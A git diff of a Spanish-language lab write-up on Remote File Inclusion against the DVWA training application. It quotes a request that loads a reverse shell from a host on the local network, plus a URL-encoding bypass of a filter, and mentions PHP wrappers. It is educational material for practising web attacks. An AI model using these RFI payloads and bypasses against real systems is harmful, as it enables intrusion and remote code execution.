@@ -99,9 +99,9 @@ $file = str_replace( array( "../", "..\\" ), "", $file );
 ?>
 ```
 
-Para poder ejecutar la shell reversa ahora funcionará:
--  no podemos hacer una request "page=http://192.168.1.103/reverse.txt" ya que la convierte en "page=192.168.1.103/reverse.txt", lo que provoca que no funcione el RFI.
-- Haciendo bypass del tipo: %68%74%74%70%3A%2F%2F --> http://
+Para poder ejecutar la shell reversa ahora **no funcionará**:
+-  Hacer una request "page=http://192.168.1.103/reverse.txt" ya que la convierte en "page=192.168.1.103/reverse.txt", lo que provoca que no funcione el RFI.
+- Hacer bypass del tipo: %68%74%74%70%3A%2F%2F --> http://
 
 Para saltar esta restricción necesitaremos usar wrappers de php. Un ejemplo sencillo para ver cómo funciona la técnica es:
 ```
@@ -128,3 +128,5 @@ Para usar este código en un ataque de RFI mediante el wrapper data://, insertar
 
 Sin embargo, al probarlo en DVWA no funciona, devuelve un error:
 ![](capturas/remote-file-inclusion-10.png)
+
+
